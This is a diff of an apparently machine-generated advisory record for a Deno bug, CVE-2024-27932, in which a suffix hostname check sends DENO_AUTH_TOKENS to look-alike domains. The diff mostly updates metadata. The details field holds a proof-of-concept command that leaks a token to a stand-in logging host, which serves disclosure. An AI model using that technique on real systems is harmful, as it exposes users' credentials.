@@ -1,19 +1,20 @@
 {
-    "schema_version": "1.7.4",
+    "schema_version": "1.8.0",
     "id": "JLSEC-2026-104",
-    "modified": "2026-04-14T13:10:46.494Z",
+    "modified": "2026-07-17T23:50:43.660Z",
     "published": "2026-04-14T13:10:46.494Z",
     "upstream": [
-        "EUVD-2024-0827",
         "CVE-2024-27932",
-        "GHSA-5frw-4rwq-xhcr"
+        "GHSA-5frw-4rwq-xhcr",
+        "EUVD-2024-0827"
     ],
     "summary": "Deno's improper suffix match testing for DENO_AUTH_TOKENS",
     "details": "### Summary\n\nDeno improperly checks that an import specifier's hostname is equal to or a child of a token's hostname, which can cause tokens to be sent to servers they shouldn't be sent to. An auth token intended for `example.com` may be sent to `notexample.com`.\n\n### Details\n\n[auth_tokens.rs uses a simple ends_with check](https://github.com/denoland/deno/blob/3f4639c330a31741b0efda2f93ebbb833f4f95bc/cli/auth_tokens.rs#L89), which matches `www.deno.land` to a `deno.land` token as intended, but also matches `im-in-ur-servers-attacking-ur-deno.land` to `deno.land` tokens.\n\n### PoC\n\n  - Set up a server that logs requests. RequestBin will do. For example, `denovulnpoc.example.com`.\n  - Run `DENO_AUTH_TOKENS=a1b2c3d4e5f6@left-truncated.domain deno run https://not-a-left-truncated.domain`. For example, `DENO_AUTH_TOKENS=a1b2c3d4e5f6@poc.example.com deno run https://denovulnpoc.example.com`\n  - Observe that the token intended only for the truncated domain is sent to the full domain\n\n### Impact\n\n_What kind of vulnerability is it? Who is impacted?_\nAnyone who uses DENO_AUTH_TOKENS and imports potentially untrusted code is affected.",
     "severity": [
         {
             "type": "CVSS_V3",
-            "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"
+            "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",
+            "source": "NVD"
         }
     ],
     "affected": [
@@ -41,6 +42,10 @@
     "references": [
         {
             "type": "WEB",
+            "url": "https://github.com/advisories/GHSA-5frw-4rwq-xhcr"
+        },
+        {
+            "type": "WEB",
             "url": "https://github.com/denoland/deno/blob/3f4639c330a31741b0efda2f93ebbb833f4f95bc/cli/auth_tokens.rs#L89"
         },
         {
@@ -54,26 +59,22 @@
         {
             "type": "WEB",
             "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27932"
-        },
-        {
-            "type": "WEB",
-            "url": "https://github.com/advisories/GHSA-5frw-4rwq-xhcr"
         }
     ],
     "credits": [
-        {
-            "name": "easrng",
-            "contact": [
-                "https://github.com/easrng"
-            ],
-            "type": "REPORTER"
-        },
         {
             "name": "mmastrac",
             "contact": [
                 "https://github.com/mmastrac"
             ],
             "type": "REMEDIATION_DEVELOPER"
+        },
+        {
+            "name": "easrng",
+            "contact": [
+                "https://github.com/easrng"
+            ],
+            "type": "REPORTER"
         }
     ],
     "database_specific": {
@@ -81,15 +82,18 @@
         "sources": [
             {
                 "id": "CVE-2024-27932",
-                "imported": "2026-04-14T12:58:55.024Z",
-                "modified": "2025-01-03T19:19:52.197Z",
+                "imported": "2026-07-17T21:08:56.723Z",
+                "modified": "2026-06-17T07:20:37.380Z",
                 "published": "2024-03-21T02:52:21.953Z",
                 "url": "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-27932",
-                "html_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27932"
+                "html_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27932",
+                "database_specific": {
+                    "status": "Analyzed"
+                }
             },
             {
                 "id": "GHSA-5frw-4rwq-xhcr",
-                "imported": "2026-04-14T12:58:59.425Z",
+                "imported": "2026-07-17T21:08:56.922Z",
                 "modified": "2024-03-21T18:25:43Z",
                 "published": "2024-03-06T17:03:36Z",
                 "url": "https://api.github.com/advisories/GHSA-5frw-4rwq-xhcr",
@@ -97,7 +101,7 @@
             },
             {
                 "id": "EUVD-2024-0827",
-                "imported": "2026-04-14T12:58:57.176Z",
+                "imported": "2026-07-17T21:09:05.325Z",
                 "modified": "2024-08-05T16:59:34Z",
                 "published": "2024-03-06T20:45:16Z",
                 "url": "https://euvdservices.enisa.europa.eu/api/enisaid?id=EUVD-2024-0827",
